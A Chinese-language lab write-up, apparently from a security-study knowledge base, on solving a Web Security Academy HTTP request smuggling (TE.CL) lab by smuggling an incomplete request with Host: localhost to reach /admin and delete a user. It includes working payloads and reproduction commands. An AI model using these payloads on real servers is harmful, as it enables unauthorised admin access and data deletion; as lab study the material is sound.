---
title: "lab-bypass-front-end-controls-te-cl"
links:
  - target: request-smuggling-family
    relation: evidences
---

# lab-bypass-front-end-controls-te-cl

> evidences: [[request-smuggling-family]]

- 题面:Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
  (/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)
- 实例:https://0a5500dc03b2551280178a28008b002d.web-security-academy.net
- 判定目标:走私请求访问后端 `/admin` 并删 carlos;状态:**solved**(solved_check true)

## 关键步

1. 直连 `GET /admin` → 前端 `403` `"Path /admin is blocked"`;走私过去 → 后端 `401`
   **"Admin interface only available to local users"**(同 CL.TE 版:要 `Host: localhost`)。
2. 帧:**TE.CL**。`conn_reuse --te-cl '<走私请求>'` 会构造
   `POST / … Content-Length: 4 … Transfer-Encoding: chunked … \r\n{hex(len)}\r\n<走私请求>\r\n0\r\n\r\n`。
   后端(CL=4)只读 `{hex}\r\n`,余下 `<走私请求>\r\n0\r\n\r\n` 成为它的下一个请求。
3. 走私请求写成**未完成式**:`GET /admin HTTP/1.1\r\nHost: localhost\r\nContent-Length: 15\r\n\r\nx=1`
   (只给 3 字节 body)→ 后端等下一请求的字节补全 → 响应借下一请求交付给我们。
   - 反例(实测):走私请求 body 给足(如 `Content-Length: 5` + `abcde`,自足完成)→ 响应被前端丢弃,
     下一请求只拿到普通首页。
4. 读面板:第 1 帧后普通 `GET /` → **200、`Content-Length: 3315`、`Cache-Control: no-cache`** 的管理面板,
   含 `<a href="/admin/delete?username=carlos">Delete</a>`。
5. 删除:把路径换成 `GET /admin/delete?username=carlos HTTP/1.1` → 随后普通请求回 **302 `Location: /admin`** → 翻。

## 证据摘录

```
lab_http get "<lab>/admin" -> 403 "Path /admin is blocked"
conn_reuse "<lab>/" --te-cl 'GET /admin HTTP/1.1\r\nHost: localhost\r\nContent-Length: 15\r\n\r\nx=1' --read-ms 2500 --quiet
conn_reuse "<lab>/" --send-str 'GET / HTTP/1.1\r\nHost: <lab>\r\n\r\n' --read-ms 3000
 -> HTTP/1.1 200 OK  Content-Length: 3315  Cache-Control: no-cache      # 管理面板
   html: <a href="/admin/delete?username=carlos">Delete</a>
conn_reuse "<lab>/" --te-cl 'GET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\nContent-Length: 15\r\n\r\nx=1' --read-ms 2500 --quiet
conn_reuse "<lab>/" --send-str 'GET / HTTP/1.1\r\nHost: <lab>\r\n\r\n' --read-ms 3000
 -> HTTP/1.1 302 Found  Location: /admin
solved_check "<lab>/" --jar JAR -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_launch launch C91DF7D449CC4882B6BC0E5D19694F659ACDCFBA2C19706C49C67F947891D53C \
  --widget-source /web-security/request-smuggling/exploiting --jar JAR
conn_reuse "<lab>/" --te-cl 'GET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\nContent-Length: 15\r\n\r\nx=1' --quiet
conn_reuse "<lab>/" --send-str 'GET / HTTP/1.1\r\nHost: <lab>\r\n\r\n'
solved_check "<lab>/" --jar JAR
```

要点:与 CL.TE 版同一套心法 —— `Host: localhost` + **走私请求故意不完整**(body 欠字节),
TE.CL 版走私请求自足完成时响应会被丢弃。
